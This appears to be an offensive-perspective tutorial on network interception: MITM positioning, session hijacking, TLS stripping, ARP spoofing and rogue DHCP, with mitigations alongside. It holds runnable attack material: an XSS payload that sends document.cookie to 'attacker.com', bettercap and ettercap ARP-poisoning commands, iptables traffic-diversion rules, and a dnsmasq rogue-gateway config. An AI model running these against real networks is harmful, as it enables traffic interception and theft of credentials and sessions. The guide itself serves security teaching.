# Network Attacks & Adversary Tradecraft: Offensive Perspective

---

## MITM Attacks
### Interception Mechanisms: Positioning on the Wire
Positioning on the wire is the offensive phase of a Man-in-the-Middle/MITM attack where an adversary manipulates network protocols to force target traffic through an attacker-controlled node. From an offensive tradecraft perspective, this requires abusing the implicit trust built into fundamental Layer 2/Data Link, Layer 3/Network, and application-routing protocols.

By forcing traffic through their system, adversaries gain the ability to sniff plain text tokens, inject malicious payloads, or downgrade encryption protocols such as stripping `TLS`.

#### **Layer 2 Interception: Local Area Networks/LAN**
At the Data Link layer, attackers target the mapping between hardware addresses/MAC and logical addresses/IP within a single broadcast domain.
* **ARP Spoofing/Poisoning**: The attacker sends unsolicited, spoofed Address Resolution Protocol/`ARP` replies to a target machine and the local gateway. These packets map the gateway’s `IP` to the attacker's `MAC` address, and the target's `IP` to the attacker's `MAC` address. This forces all traffic between the two hosts to route through the attacker's network interface card/`NIC`.
* **MAC Flooding**: Attackers flood a network switch's Content Addressable Memory/`CAM` table with fake `MAC` addresses using tools like `macof`. Once the `CAM` table exhausts its memory, the switch fails open, reverting to a hub-like state where it broadcasts all network frames to every single port, allowing passive sniffing.
* **DHCP Rogue Server Deployment**: The adversary spins up a malicious `DHCP` server on the local subnet. By responding to `DHCP` discovery requests faster than the legitimate server, the attacker assigns targets an `IP` address while designating the attacker’s own machine as the Default Gateway and `DNS` Server.

#### **Layer 3 & Routing Interception: Wide Area Networks/WAN**
When targeting systems outside the local broadcast domain, offensive tradecraft shifts to manipulating network routing layers.
* **ICMP Redirect Attacks**: Attackers send spoofed Internet Control Message Protocol/`ICMP` Type 5/Redirect packets to a target host. The message informs the target that a better path exists to a specific destination through the attacker’s `IP` address, tricking the OS routing table into updating its gateways.
* **BGP Hijacking**: At an internet-wide scale, adversaries use compromised autonomous systems/`AS` to announce malicious Border Gateway Protocol/`BGP` routing paths. By claiming the shortest, most specific cryptographic path to an `IP` prefix, entire blocks of global internet traffic are pulled through an attacker’s infrastructure before being relayed to the true destination.

#### **Wireless & Proximity Interception**
In wireless environments, attackers exploit the automated roaming and reconnection logic hardcoded into client devices.
* **Evil Twin Access Points**: Attackers deploy a physical rogue wireless access point broadcasting the exact Service Set Identifier/`SSID` of a legitimate network. By broadcasting a stronger signal or sending `802.11` deauthentication frames to force clients off the real network, devices automatically roam and authenticate to the attacker's high-signal clone.
* **LLMNR/NBT-NS Poisoning**: When a Windows device fails to resolve a hostname via `DNS`, it falls back to Link-Local Multicast Name Resolution/`LLMNR` and NetBIOS Name Service/`NBT-NS` to ask the local network for the asset. Attackers use tools like `Responder` to listen for these broadcasts and reply instantly, claiming to be the requested resource and forcing the target to send `NTLM` credential hashes to the attacker.

#### **Mechanical Comparison of Interception Vectors**

| Interception Mechanism | Target Layer | Scope | Primary Vulnerability Exploited | Attack Profile |
| --- | --- | --- | --- | --- |
| ARP Spoofing | Layer 2 | Local Subnet | Lack of authentication in `ARP` replies | Active/High Noise |
| DHCP Rogue Server | Layer 7/3 | Local Subnet | Race condition; trust in first responder | Active/Persistent |
| ICMP Redirect | Layer 3 | Local Subnet | Weak host verification of route messages | Active/Targeted |
| BGP Hijacking | Layer 3 (Core) | Global/ISP | Weak validation between Autonomous Systems | Active/High Impact |
| LLMNR Poisoning | Application | Local Subnet | Local broadcast fallback resolution | Passive Listener/Active Responder |


### Session Hijacking: Stealing Active Tokens
Once an adversary establishes positioning on the wire, the primary objective often shifts from passive sniffing to session hijacking. Instead of attempting to crack complex passwords, offensive tradecraft focuses on stealing active session tokens such as cookies, JSON Web Tokens/`JWT`, or OAuth access tokens to completely bypass Multi-Factor Authentication/`MFA` and gain immediate access to an authenticated web session.

#### **In-Transit Token Theft/On-the-Wire**
When an attacker sits in the network path, they intercept active sessions by manipulating the transport layer.
* **TLS/SSL Stripping/Downgrade Attacks**: Attackers use tools like `sslstrip` to intercept `HTTP` requests from a user attempting to connect to a secure site. The attacker establishes an `HTTPS` connection with the legitimate server but relays plain-text `HTTP` back to the victim. Any session token subsequently generated by the server is transmitted over the wire in the clear, allowing the attacker to grab it instantly.
* **Exploiting Missing Flags**: If developers fail to configure security attributes on authentication cookies, attackers on the wire can harvest them easily:
* **Missing Secure Flag**: Forces the browser to transmit the session cookie over unencrypted `HTTP` requests such as background assets or image loads, exposing the token to local sniffers even if the main site uses `HTTPS`.
* **Missing HttpOnly Flag**: Allows any script running in the browser context to access the token via `document.cookie`.

#### **Adversary-in-the-Middle/AitM Phishing**
Modern session hijacking rarely relies on legacy credential harvesting because `MFA` blocks simple password reuse. Instead, offensive tradecraft uses `AitM` proxying to capture live sessions at the moment of login.

| Traffic Flow Step | Source | Protocol/Direction | Destination |
| --- | --- | --- | --- |
| 1. Client Request | Victim Browser | `HTTP`/`HTTPS` -> | `AitM` Proxy (`Evilginx`) |
| 2. Proxy Relay | `AitM` Proxy (`Evilginx`) | `HTTP`/`HTTPS` -> | Legitimate Cloud Service |
| 3. Credential/`MFA` Handshake | Victim Browser | Real-time forwarding via Proxy | Legitimate Cloud Service |
| 4. Token Capture | Legitimate Cloud Service | Issues Session Cookie -> Intercepted by Proxy | Victim Browser (Redirected) |

* **Reverse Proxy Infrastructure**: Attackers deploy frameworks like `Evilginx`, `Mitmproxy`, or `Modlishka` on a malicious domain mimicking a legitimate corporate portal.
* **Real-Time Relaying**: When the victim lands on the proxy site, the backend forwards the real login page from the legitimate cloud service to the victim.
* **MFA Interception**: The victim enters their username, password, and completes the `MFA` prompt such as `SMS`, an Authenticator App, or a Push Notification. The proxy transparently forwards these responses to the true service provider.
* **Token Harvesting**: Once authentication is successful, the legitimate service issues a session cookie back through the proxy. The attacker intercepts and saves this cookie while redirecting the user to their actual dashboard. The attacker can now import this cookie into any browser to clone the live session.

#### **Client-Side & Local Extraction**
If network interception isn't feasible, attackers target token storage locations directly on the victim's operating system or within the browser context.
* **Cross-Site Scripting/XSS**: If an application is vulnerable to stored or reflected `XSS`, an attacker injects a malicious JavaScript snippet like `fetch('http://attacker.com' + document.cookie)`. If the `HttpOnly` flag is missing, the script extracts the active token and sends it straight to the attacker's server.
* **Browser Artifact Hunting**: Session tokens are regularly cached on the local disk. Attackers who achieve code execution on an endpoint via malware or a command shell target browser storage databases to extract active sessions without needing administrative privileges:
* **SQLite Databases**: Browsers like Google Chrome and Microsoft Edge store cookies in `SQLite` format under user profiles, for example in `%LocalAppData%\Google\Chrome\User Data\Default\Network\Cookies`.
* **DPAPI Decryption**: Modern browsers encrypt these databases using the operating system's Data Protection API/`DPAPI`. Offensive post-compromise tools run scripts matching the user's context to decrypt the `SQLite` master keys and extract valid, live session cookies in cleartext.

#### **Architectural Mitigations**
Defenders combat session hijacking by minimizing the utility of stolen tokens:
* **FIDO2/WebAuthn/Hardware Keys**: Unlike `SMS` or standard push notifications, hardware-backed authentication binds the session to the specific cryptographic domain origin, completely neutralizing `AitM` reverse proxies.
* **Continuous Access Evaluation/CAE**: Modern identity providers like Azure AD evaluate sessions in real time, immediately revoking a token if a user's `IP` address suddenly shifts countries or changes out of corporate compliance blocks.


### SSL/TLS Stripping: Downgrading Secure Traffic
`SSL`/`TLS` Stripping is an offensive technique that forces a target’s browser to communicate with an Adversary-in-the-Middle/`AitM` proxy over an unencrypted `HTTP` connection, even if the destination web server supports or prefers `HTTPS`.

By downgrading the secure transport layer to cleartext, the attacker can view, capture, and manipulate all session tokens, credentials, and sensitive data passing through the wire.

#### **The Mechanics of a Stripping Attack**
For an `SSL`/`TLS` stripping attack to work, the adversary must first achieve positioning on the wire, for example via `ARP` spoofing or a rogue access point, to intercept the victim's traffic. The classic attack lifecycle follows these steps:

| Traffic Flow Step | Source | Protocol/Direction | Destination |
| --- | --- | --- | --- |
| 1. Inbound Request | Victim Browser | Unencrypted `HTTP` -> | Attacker Proxy (`sslstrip`/`bettercap`) |
| 2. Proxied Connection | Attacker Proxy (`sslstrip`/`bettercap`) | Secure `HTTPS` -> | Target Web Server |
| 3. Server Response | Target Web Server | Secure `HTTPS` -> | Attacker Proxy (`sslstrip`/`bettercap`) |
| 4. Downgrade Delivery | Attacker Proxy (`sslstrip`/`bettercap`) | Rewritten Cleartext `HTTP` -> | Victim Browser |

* **The Interception Entrypoint**: The victim types a `URL` into their browser without specifying the protocol or clicks a legacy link pointing to `http://example.com`. By default, browsers initiate an unencrypted `HTTP` request for the initial handshake.
* **The Proxy Interception**: The attacker's proxy catches this inbound `HTTP` request. Instead of letting it pass directly, the proxy establishes its own secure `HTTPS` connection onward to the legitimate web server.
* **The Server Response**: The legitimate web server responds to the attacker over the secure `HTTPS` channel, serving up the login page or application dashboard.
* **The Downgrade Rewrite**: Before passing the server’s response back to the victim, the attacker's proxy scans the incoming `HTML`, JavaScript, and headers. The proxy rewrites every secure reference it finds:
  * Changes absolute links from `https://` to `http://`
  * Alters form submission targets like `<form action="https://...">` to point to insecure `HTTP` endpoints.
* **The Cleartext Delivery**: The modified, entirely unencrypted `HTTP` page is delivered to the victim. To the untrained eye, the webpage looks identical to the real site, but the critical lock icon is missing from the browser's address bar.
* **Token Harvesting**: When the victim submits credentials or receives session cookies, the data travels back to the attacker in cleartext, allowing instant session hijacking.

#### **Bypassing Modern Protections: The HSTS Hurdle**
Over time, browser vendors introduced `HTTP` Strict Transport Security/`HSTS` to neutralize basic stripping. `HSTS` is an `HTTP` response header like `Strict-Transport-Security: max-age=31536000` that instructs browsers to never communicate with the domain over unencrypted `HTTP`, automatically converting all `http://` attempts to `https://` client-side before touching the wire.

To bypass `HSTS`, offensive tradecraft evolved from simple string stripping to Domain Name Homograph and Spoofing Attacks:
* **Lookalike Domain Routing**: If the attacker encounters a domain protected by `HSTS`, the proxy cannot downgrade the direct traffic because the browser refuses to send `HTTP` packets to that specific host. The proxy compensates by rewriting links within the traffic to a slightly modified, un-`HSTS`-protected domain that the attacker owns, such as a domain using Cyrillic lookalike characters.
* **The HSTS Preload List Limitation**: `HSTS` only protects a user on their first visit if the domain is hardcoded into the browser's `HSTS` Preload List. If an application relies solely on the dynamic header and a user connects to it for the very first time on an untrusted network, the attacker can strip the initial response before the browser ever receives the `HSTS` instruction.

#### **Mitigations: Solidifying the Encrypted Tunnel**
Defenders completely break the `SSL`/`TLS` stripping lifecycle by eliminating the opportunity for an initial unencrypted handshake:
* **Enforce Preloaded HSTS**: Developers should submit their domains to the global `hstspreload.org` registry. This ensures that browsers ship with an unbypassable rule to force `HTTPS` for that domain out-of-the-box, blocking the initial `HTTP` packet required for a stripping attack.
* **HTTPS-Only Mode**: Modern browsers feature configurations that block all plain-text `HTTP` traffic globally. If a website doesn't support `HTTPS`, the browser explicitly displays a full-screen warning page and prevents automatic fallback.

---

## ARP Spoofing
### Cache Poisoning: Mapping MAC to Target IP
`ARP` Spoofing/`ARP` Cache Poisoning is a fundamental Layer 2 offensive technique used to establish an Adversary-in-the-Middle/`AitM` position on a Local Area Network/`LAN`. The attack exploits an inherent design flaw in the Address Resolution Protocol/`ARP`: its complete lack of authentication or state verification.

By sending forged identity claims, an attacker forces neighboring devices to update their internal mapping tables, routing traffic directly to the attacker’s machine instead of its legitimate destination.

#### **The Fundamental Flaw: Stateless ARP**
To route traffic across a local switch, devices must map a Layer 3 logical address/`IP` to a Layer 2 physical address/`MAC`. `ARP` handles this dynamically. When a machine wants to talk to an `IP`, it broadcasts an `ARP` Request asking, "Who has this `IP`? Tell me." The owner responds with an `ARP` Reply.

The vulnerability lies in two architectural behaviors:
* **Implicit Trust**: Operating systems don't verify the authenticity of an `ARP` reply. They assume that if an `ARP` reply arrives, it is legitimate.
* **Stateless/Unsolicited Processing**: Most operating systems process unsolicited `ARP` replies. An attacker can send an `ARP` reply to a target device even if that device never sent an `ARP` request. The target will blindly accept the packet and overwrite its local memory cache.

#### **Step-by-Step Execution: Mapping the MAC**
To intercept bidirectional traffic between a target victim and the local default gateway, the attacker must poison the `ARP` caches of both devices simultaneously.
* **The Network Baseline**:
  * **Victim Machine**: `IP` `192.168.1.50` | `MAC` `AA:AA:AA:AA:AA:AA`
  * **Default Gateway**: `IP` `192.168.1.1` | `MAC` `BB:BB:BB:BB:BB:BB`
  * **Attacker Machine**: `IP` `192.168.1.99` | `MAC` `CC:CC:CC:CC:CC:CC`

#### **Enabling IP Forwarding/The Prerequisites** Before launching the attack, the adversary must configure their own operating system kernel to act as a router. If they don't, the attacker's OS will drop the victim's packets as soon as they arrive, creating an immediate Denial of Service/`DoS` and alerting the user.
* **Linux command used**: `sysctl -w net.ipv4.ip_forward=1`

#### **Poisoning the Victim**
The attacker crafts a malicious, unsolicited `ARP` reply packet targeted directly at the victim’s `IP` address.
* **The Lie**: "Hey `192.168.1.50` (Victim), the `IP` `192.168.1.1` (Gateway) is located at my `MAC` address: `CC:CC:CC:CC:CC:CC`."
* **Result**: The victim updates its internal `ARP` cache table. When the victim attempts to send a packet to the internet, it wraps the Layer 3 `IP` packet in a Layer 2 frame destined for the attacker’s physical network card (`CC:CC:CC:CC:CC:CC`).

#### **Poisoning the Gateway**
Simultaneously, the attacker crafts a reciprocal malicious `ARP` reply targeted at the default gateway.
* **The Lie**: "Hey `192.168.1.1` (Gateway), the `IP` `192.168.1.50` (Victim) is located at my `MAC` address: `CC:CC:CC:CC:CC:CC`."
* **Result**: The gateway updates its `ARP` cache. Any response traffic returning from the internet meant for the victim is framed and transmitted straight to the attacker's machine.

| Phase | Sender | Receiver | Payload Message | Traffic Outcome |
| --- | --- | --- | --- | --- |
| 1. Poison Victim | Attacker (`CC:CC`) | Victim (`AA:AA`) | "`192.168.1.1` is at `CC:CC`" | Victim outbound traffic routes to Attacker |
| 2. Poison Gateway | Attacker (`CC:CC`) | Gateway (`BB:BB`) | "`192.168.1.50` is at `CC:CC`" | Gateway inbound traffic routes to Attacker |
| 3. Intercept & Forward | Victim (`AA:AA`) | Attacker (`CC:CC`) | Outbound packet to internet | Attacker inspects and forwards to Gateway |
| 4. Intercept & Return | Gateway (`BB:BB`) | Attacker (`CC:CC`) | Inbound packet from internet | Attacker inspects and forwards to Victim |

#### **Mechanics of the Forged Packet**
Offensive tools like `arpspoof`, `bettercap`, or custom Python `Scapy` scripts loop this transmission every few seconds. This constant looping is necessary because legitimate network traffic or normal `ARP` timeouts will otherwise cause the devices to naturally refresh their caches with the correct mappings.
* **Inside the forged Ethernet frame**:
  * **Source MAC (Layer 2)**: `CC:CC:CC:CC:CC:CC` (Attacker)
  * **Sender MAC (ARP Payload)**: `CC:CC:CC:CC:CC:CC` (Attacker)
  * **Sender IP (ARP Payload)**: `192.168.1.1` (Spoofed Gateway Identity)

#### **Structural Defensive Countermeasures**
Because `ARP` spoofing operates entirely at Layer 2, standard upstream firewalls cannot prevent it. Networks must deploy specific local defenses:
* **Dynamic ARP Inspection/DAI**: High-end network switches intercept and validate all `ARP` packets on the wire. `DAI` cross-references incoming `ARP` replies against a trusted database populated by `DHCP` Snooping. If a port attempts to send an `ARP` reply stating it owns an `IP` address not assigned to it by `DHCP`, the switch drops the packet and shuts down the port.
* **Static ARP Tables**: For critical, permanent infrastructure such as servers communicating exclusively with a core gateway, administrators can hardcode the `MAC`-to-`IP` pairings directly into the OS configuration. This blocks the operating system from dynamically modifying the cache via unsolicited network packets.


### Tools of the Trade: Ettercap and Bettercap Execution
When executing a Man-in-the-Middle/`AitM` attack to position oneself on the wire, adversaries rely on highly automated framework tools. `Ettercap` and `Bettercap` are the industry standards for Layer 2 manipulation, packet sniffing, and protocol harvesting.

While `Ettercap` is a legacy, thread-heavy C-based utility, `Bettercap` is its modern, highly asynchronous Go-based successor designed for complex automation, wireless manipulation, and integrated script execution.

#### **Bettercap Execution Tradecraft/The Modern Standard**
`Bettercap` abstracts complex network tasks into modular sub-systems called caplets. It operates on an asynchronous event loop, making it significantly more stable on modern high-throughput networks.
* **The Command-Line Sequence**: To launch a silent `ARP` poisoning attack targeting a specific device and its gateway using `Bettercap`, an offensive operator runs the following sequential interactive modules:

```bash
# Start Bettercap on a specific network interface
bettercap -iface eth0
```

Once inside the interactive prompt, the operator configures the execution environment:

```txt
# 1. Start the active network discovery module to map the subnet
net.probe on

# 2. View discovered hosts to isolate the target's IP address
net.show

# 3. Configure the ARP spoofing engine parameters
set arp.spoof.targets 192.168.1.50   # The victim host IP
set arp.spoof.internal true          # Target local network routing
set arp.spoof.fullduplex true        # Poison BOTH victim and gateway tables

# 4. Initiate the attack (automatically handles OS IP forwarding)
arp.spoof on

# 5. Enable the packet sniffer module to extract credentials on the fly
net.sniff on
```

#### **Offensive Advantage**
`Bettercap` includes a built-in transparent `HTTP`/`HTTPS` proxy subsystem. By typing `http.proxy on` or `https.proxy on`, it can automatically execute downstream web payload injections, handle live `SSL`/`TLS` stripping, or rewrite responses using JavaScript extensions in real time.
* **Ettercap Execution Tradecraft/The Legacy Utility**: `Ettercap` remains prevalent in automated offensive testing scripts and legacy security toolchains. It operates primarily in two modes: text-only interactive console (`-T`) or graphical UI (`-G`).
* **The Console Execution Sequence**: To achieve identical positioning using `Ettercap` via a single automated string command, an attacker initiates a targeted unified sniffing pass:

```bash
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.50//
```

* **Breaking Down the Flags**:
  * **-T**: Activates the text-only user interface, minimizing screen output and system overhead.
  * **-q**: Enables quiet mode, which suppresses printing every captured packet to standard output, storing only intercepted credentials.
  * **-i eth0**: Explicitly binds `Ettercap` to the desired network interface card.
  * **-M arp:remote**: Invokes the `MitM` module using the `ARP` Poisoning method. The remote keyword instructs `Ettercap` to sniff bidirectional external traffic, bypassing default host separation rules.
  * **/192.168.1.1// /192.168.1.50//**: The targeted network scope notation. The format mirrors `/IP/IPv6/MAC/Ports`. By keeping slots blank, the tool defaults to targeting any `MAC`/Port combination on the specified IPs. This specifically chains the Gateway (`192.168.1.1`) to the Victim (`192.168.1.50`).

#### **Structural Capabilities: Ettercap vs. Bettercap**

| Operational Attribute | Ettercap (Legacy C) | Bettercap (Modern Go) |
| --- | --- | --- |
| Concurrency Architecture | Native POSIX multi-threading (prone to race conditions/crashes under heavy network load) | Asynchronous Go routines (highly performant on gigabit and cloud networks) |
| Subnet Reconnaissance | Relies primarily on aggressive, noisy broadcast requests | Supports passive background listening alongside active network probing |
| Extensibility | Requires writing custom compiled C plugins or static filters | Supports scriptable JavaScript wrappers and automated text `.cap` configuration files |
| Wireless (802.11/BLE) | Strictly limited to wired Ethernet networks | Native support for Wi-Fi monitor mode sniffing, deauthentication attacks, and `BLE` tracking |

#### **Operational Security/OPSEC Traps**
Using these tools out-of-the-box carries extreme signature noise. Defenders look for clear structural indicators to flag this tradecraft:
* **MAC Address Flapping**: If `Bettercap` or `Ettercap` crashes or is terminated improperly without executing its native cleanup routines, the victim's and gateway's `ARP` tables remain permanently corrupted. This breaks network connectivity entirely, creating a Denial of Service, and instantly alerts infrastructure admins.
* **The ARP Storm**: When running active probing via `net.probe on` or `Ettercap` host scans, the tools flood the network broadcast domain with sequential discovery requests. Security Information and Event Management/`SIEM` systems effortlessly flag this as network scanning anomalies.


### Traffic Redirection: Establishing the Man in the Middle
Establishing a Man-in-the-Middle/`AitM` position relies entirely on Traffic Redirection. Even if an adversary successfully executes an exploit or protocol poisoning attack, traffic won't reach their analysis tools unless the host operating system's kernel, network interfaces, and system routing tables are explicitly configured to handle, manipulate, and pass that data along without dropping it.

#### **Kernel-Level Routing: IP Forwarding**
By default, modern operating systems are designed as endpoints, not routers. If a network interface receives an `IP` packet destined for a different `IP` address, the kernel security policy automatically drops it. To establish an `AitM` position, the attacker must first transform their machine into a transparent Layer 3 router.
* **Linux Implementation**: The adversary modifies the live kernel parameters using `sysctl` or by writing directly to the virtual file system. This ensures the Linux network stack routes intercepted transit packets back out of the interface toward their true destination.

```bash
# Enable IPv4 forwarding instantly in kernel memory
sudo sysctl -w net.ipv4.ip_forward=1
# Alternative method via procfs
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

* **Windows Implementation**: If executing from a Windows platform, the routing behavior is controlled by the Remote Access service registry hives.

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v IPEnableRouter /t REG_DWORD /d 1 /f
```

#### **Local Packet Interception: Interface Queuing**
Once the kernel allows packet forwarding, the incoming traffic still naturally flows straight through the network stack to its external destination. To analyze or manipulate the data, the attacker must redirect specific ports or protocols into local software sockets such as `bettercap`, `mitmproxy`, or custom script listeners. This is achieved using the host's packet filtering engine, specifically `Netfilter`/`iptables` on Linux.
* **The Prerouting Hook**: Attackers abuse the `PREROUTING` chain within the Network Address Translation/`NAT` table. This chain catches packets the exact moment they hit the network interface card/`NIC`, before the kernel makes any standard routing decisions.

| Packet Flow Step | Condition | Action Taken |
| --- | --- | --- |
| 1. Incoming Packet Hits `NIC` | Enters `PREROUTING` Hook | Evaluated against `iptables` rules |
| 2. Rule Match Detected | Matches defined port/protocol | `REDIRECT` to local proxy socket port |
| 3. No Rule Match Detected | Standard transit packet | Standard `IP` forwarding out to Gateway |

#### **Common Redirection Rules**
Operators use precise firewall rules to isolate and funnel high-value target protocols while ignoring background corporate white-noise traffic:
* **Funneling Web Traffic**: Redirects cleartext web traffic into a local `HTTP` transparent proxy.

```bash
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 8080
```

* **Intercepting Secure Web Traffic**: Redirects `HTTPS` data into an `SSL`/`TLS` stripping or proxy interception tool.

```bash
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-ports 8443
```

* **DNS Hijacking**: Intercepts outbound local `DNS` requests and forces them into a malicious `DNS` responder.

```bash
sudo iptables -t nat -A PREROUTING -i eth0 -p udp --dport 53 -j REDIRECT --to-ports 5353
```

#### **Layer 2 Interface Control: Promiscuous Mode**
Standard network interface behavior dictates that a physical `NIC` ignores any Ethernet frames on the wire unless the destination `MAC` address matches its own hardware `MAC`, or the frame is a global network broadcast.

When executing positioning attacks that flood or redirect local switch traffic, the adversary must force their physical network card into Promiscuous Mode. This instruction tells the hardware controller to bypass `MAC` address destination filtering entirely, passing every raw bit flowing across the shared physical or wireless medium straight up to user-space capturing utilities like `Wireshark` or `tcpdump`.

```bash
# Force the interface to process all local wire frames
sudo ip link set eth0 promisc on
```

#### **Operational Comparison of Redirection Vectors**

| Redirection Layer | Core Tooling | Network Footprint | Detection Vulnerability | Primary Purpose |
| --- | --- | --- | --- | --- |
| Kernel Forwarding | `sysctl`/`procfs` | Completely Silent | Zero network alerts | Prevents immediate target Denial of Service/`DoS` |
| Port Redirection | `iptables`/`nftables` | Host-Internal | Local process auditing | Funnels raw streams into interactive proxy sockets |
| Hardware Sniffing | Promiscuous Mode | Completely Silent | System logs (`dmesg`) | Captures raw traffic crossing adjacent switch lines |

---

## Rogue DHCP
### Starvation Attacks: Exhausting the IP Pool
A `DHCP` Starvation Attack is an aggressive Layer 2 offensive technique designed to exhaust a local network’s available `IP` address pool. By rendering the legitimate Dynamic Host Configuration Protocol/`DHCP` server incapable of issuing new leases, the adversary creates an operational vacuum.

This vacuum is immediately filled by deploying a Rogue `DHCP` Server, granting the attacker complete control over the network configuration (Default Gateway, `DNS`, and `IP` assignment) of all subsequent devices connecting to the subnet.

#### **Step 1: The Starvation Phase/Exhausting the Pool**
The `DHCP` protocol functions on a first-come, first-served basis without inherent authentication. An attacker exploits this by flooding the network with forged `DHCP` requests using tools like `Yersinia`, `dhcpstarv`, or custom scripts.
* **The Churn of MAC Addresses**: To exhaust an entire subnet, for example a `/24` network with about 250 available addresses, an attacker cannot use their own physical `MAC` address repeatedly, as the `DHCP` server would simply return the same leased `IP`. Instead, the attacking tool rapidly generates thousands of fake, randomized hardware source `MAC` addresses inside individual `DHCP` packets.
* **The DHCP DISCOVER Flood**: The attacker broadcasts a massive storm of `DHCPDISCOVER` packets across the local domain, each requesting an `IP` address for a unique, randomized `MAC` address.
* **Depleting the Pool**: The legitimate `DHCP` server responds to each request with a `DHCPOFFER` and subsequently registers a lease via `DHCPREQUEST` and `DHCPACK`. Within seconds, every available unassigned `IP` address in the server's scope is assigned to a non-existent machine.

| Phase | Sender | Receiver | Packet Type | Impact on Network |
| --- | --- | --- | --- | --- |
| 1. Attack Initialization | Attacker | `DHCP` Server | Rapid `DHCPDISCOVER` Storm | Spoofs thousands of randomized `MAC` addresses |
| 2. Scope Depletion | `DHCP` Server | Attacker | `DHCPOFFER` / `DHCPACK` | Commits all available `IP` leases to fake hosts |
| 3. Denial of Service | `DHCP` Server | Legitimate Client | None (Pool Exhausted) | Real users cannot obtain network configurations |

#### **Step 2: The Rogue Deployment Phase/Establishing the Pivot**
Once the legitimate server is starved, any new device joining the network, or any existing device attempting to renew its lease, will broadcast a `DHCPDISCOVER` packet that goes unanswered by the official infrastructure.
The attacker now initializes a Rogue `DHCP` Server on their own machine, which is often built directly into offensive frameworks like `bettercap` or standalone daemons like `dnsmasq`.

When a victim sends out a discovery request, the attacker's rogue server is the only operational entity capable of responding. The attacker intentionally crafts the lease parameters to position themselves as the Adversary-in-the-Middle/`AitM`:
* **IP Address Offered**: A valid `IP` within the subnet range to ensure the victim successfully configures their network interface.
* **Subnet Mask**: Standard configuration matching the local domain, such as `255.255.255.0`.
* **Malicious Default Gateway**: Crucially, the rogue server sets the Attacker's `IP` as the victim's Default Gateway. Any packet the victim attempts to send outside the local subnet (like out to the internet) will now be sent directly to the attacker's network interface card.
* **Malicious DNS Server**: The rogue server sets the Attacker's `IP`, or an attacker-controlled external resolver, as the Primary `DNS`. This allows the adversary to perform effortless `DNS` hijacking, transparently redirecting requests for domains like `login.corporate.local` to malicious infrastructure.

#### **Mechanical Comparison: Normal vs. Rogue DHCP Routing**

| Routing Element | Normal Configuration | Rogue Compromised Configuration |
| --- | --- | --- |
| **DHCP Server Source** | Legitimate Network Core Router/Server | Attacker Machine (`bettercap`/`dnsmasq`) |
| **Assigned Default Gateway** | Legitimate Local Router | Attacker Interface `IP` |
| **Assigned DNS Server** | Corporate Resolver/Trusted Public `DNS` | Attacker Interface `IP`/Malicious Resolver |
| **Target Traffic Path** | Client -> Real Gateway -> External Internet | Client -> Attacker Machine -> Real Gateway -> Internet |
| **Attacker Capability** | None (Standard Network Separation) | Full Packet Interception, `SSL` Stripping, Sniffing |

#### **Defensive Countermeasures**
Standard host-based firewalls cannot detect or block `DHCP` starvation or rogue deployments. Enterprise defense requires Switchport Security Mechanisms:
* **DHCP Snooping**: This is the absolute standard mitigation implemented on corporate managed switches. Network administrators explicitly configure switchports into Trusted and Untrusted states:
  * **Trusted Ports**: Ports physically connected to legitimate `DHCP` servers or trunk lines.
  * **Untrusted Ports**: Standard user-facing access ports.
  * **Enforcement**: If the switch detects any inbound `DHCP` server messages, such as `DHCPOFFER`, `DHCPACK`, or `DHCPNAK`, arriving on an untrusted port, it drops the packet immediately and flags an alert, completely neutralizing rogue servers.
* **Port Security**: Switches can be configured to limit the maximum number of unique `MAC` addresses allowed to communicate through a single physical port. If an attacker attempts a starvation attack by generating thousands of fake `MAC` addresses on an access port, the switch detects the threshold breach, drops the traffic, and can automatically disable the port into a shutdown state.


### Server Mimicry: Handing Out Malicious Gateways
Server Mimicry is the operational phase of a Rogue `DHCP` or `DNS` attack where the adversary actively impersonates core network infrastructure. Once positioning or resource exhaustion such as `DHCP` starvation is achieved, the attacker deploys highly tailored configuration parameters to unsuspecting clients.

By passing out an attacker-controlled address as the Default Gateway or Primary `DNS` Server, the adversary establishes a structural choke point that forces target machines to willingly route traffic straight into an inspection and manipulation pipeline.

#### **The Anatomy of a Mimicry Configuration**
When an infrastructure server mimics a legitimate routing node, it manipulates specific variables within the standard network handshake protocol. An attacker configuring a mimicry server using utilities like `dnsmasq`, `bettercap`, or custom automated configuration scripts focuses on three critical vectors:
* **The Insecure Default Router/Option 3**: Under standard `RFC 2132` specifications, `DHCP` Option 3 dictates the default gateway. The mimicry server overrides the real router's `IP` and inserts the attacker’s local `IP` address. The victim's operating system updates its kernel routing table dynamically, treating the attacker's machine as the sole egress point for any non-local network traffic.
* **The Malicious Domain Name Server/Option 6**: `DHCP` Option 6 defines the `DNS` resolvers assigned to a client. By setting this to an attacker-controlled `IP`, the adversary strips the client of trusted external lookups such as `1.1.1.1` or internal enterprise domain controllers. This enables instantaneous `DNS` spoofing, returning malicious `IP` mappings whenever the victim queries critical business URLs or single sign-on/`SSO` portals.
* **Lease Time Manipulation/Option 51**: To ensure maximum persistence and prevent the legitimate server from reclaiming the client if it recovers, the mimicry server drops the lease time/Option 51 to an exceptionally high duration. Conversely, if the attacker wants to cycle through targets rapidly or execute a quick hit-and-run operation, they drop the lease time down to minutes, forcing constant client checking.

#### **Execution Mechanics: Setting Up the Infrastructure**
To seamlessly hand out malicious network variables without causing immediate host failures, an attacker implements a twin-daemon architecture on their offensive machine.

| Deployment Phase | Component | Action Performed | System/Network Impact |
| --- | --- | --- | --- |
| 1. Provisioning Daemon | `dnsmasq` Server | Listens on target interface (`eth0`) | Hands out tailored `IP` pool with malicious Option 3 and Option 6 parameters |
| 2. Routing Configuration | Kernel Forwarding | Enables `net.ipv4.ip_forward` | Prevents packets from dropping when they reach the attacker's host |
| 3. Transparent Pipeline | `iptables` `NAT` Engine | Applies `MASQUERADE` on uplink interface (`wlan0`) | Forwards victim traffic to the actual internet to maintain seamless connectivity |

* **The Provisioning Daemon**: The attacker configures a local configuration file, typically `dnsmasq.conf`, to handle incoming requests on the targeted network interface:

```ini
interface=eth0
# Define the range of IPs to hand out to victims
dhcp-range=192.168.10.100,192.168.10.200,255.255.255.0,12h
# Option 3: Force the victim to use the attacker as the Default Gateway
dhcp-option=3,192.168.10.45
# Option 6: Force the victim to use the attacker for DNS resolution
dhcp-option=6,192.168.10.45
```

